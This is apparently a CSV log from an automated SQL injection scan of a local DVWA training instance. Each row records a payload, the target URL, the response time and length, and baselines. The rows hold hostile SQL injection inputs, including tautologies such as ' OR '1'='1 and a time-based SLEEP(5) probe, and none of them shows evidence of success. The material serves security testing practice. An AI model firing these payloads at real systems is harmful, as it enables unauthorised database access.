page_url,param_tested,method,payload,status,elapsed,length,evidence,baseline_length,baseline_elapsed
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,' OR '1'='1,200,0.024815,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.005343,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,' OR 1=1--,200,0.003933,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,""" OR """" = """,200,0.004605,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.003365,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,1' OR '1'='1,200,0.003769,2167,,2167,0.005487
http://127.0.0.1/dvwa/images/dollar.png,id,GET,' OR '1'='1,200,0.004166,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,' OR '1'='1' -- ,200,0.002568,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,' OR 1=1--,200,0.002834,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,""" OR """" = """,200,0.004015,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,' OR SLEEP(5) --,200,0.004818,287,,287,0.004768
http://127.0.0.1/dvwa/images/dollar.png,id,GET,1' OR '1'='1,200,0.0043,287,,287,0.004768
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,' OR '1'='1,200,0.005355,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,' OR '1'='1' -- ,200,0.004075,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,' OR 1=1--,200,0.005312,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,""" OR """" = """,200,0.005228,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,' OR SLEEP(5) --,200,0.006385,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,1' OR '1'='1,200,0.003708,4281,,4281,0.004389
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,' OR '1'='1,200,0.005887,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.005748,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,' OR 1=1--,200,0.005353,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,""" OR """" = """,200,0.005091,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.005908,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,1' OR '1'='1,200,0.00623,2167,,2167,0.006696
http://127.0.0.1/dvwa/images/lock.png,id,GET,' OR '1'='1,200,0.004817,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,' OR '1'='1' -- ,200,0.004753,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,' OR 1=1--,200,0.006528,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,""" OR """" = """,200,0.004898,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,' OR SLEEP(5) --,200,0.006558,731,,731,0.004069
http://127.0.0.1/dvwa/images/lock.png,id,GET,1' OR '1'='1,200,0.004294,731,,731,0.004069
http://127.0.0.1/dvwa/images/logo.png,id,GET,' OR '1'='1,200,0.004435,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,' OR '1'='1' -- ,200,0.005833,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,' OR 1=1--,200,0.004369,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,""" OR """" = """,200,0.003686,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,' OR SLEEP(5) --,200,0.004313,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/logo.png,id,GET,1' OR '1'='1,200,0.004908,4811,,4811,0.004267
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,' OR '1'='1,200,0.004615,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.005332,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,' OR 1=1--,200,0.004849,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,""" OR """" = """,200,0.004556,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.005999,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,1' OR '1'='1,200,0.00481,2167,,2167,0.005559
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,' OR '1'='1,200,0.004542,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.004887,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,' OR 1=1--,200,0.004958,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,""" OR """" = """,200,0.005117,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.005563,2167,,2167,0.005458
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,1' OR '1'='1,200,0.004854,2167,,2167,0.005458
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,' OR '1'='1,200,0.003714,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,' OR '1'='1' -- ,200,0.005585,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,' OR 1=1--,200,0.004128,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,""" OR """" = """,200,0.004526,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,' OR SLEEP(5) --,200,0.005349,1500,,1500,0.005429
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,1' OR '1'='1,200,0.00485,1500,,1500,0.005429
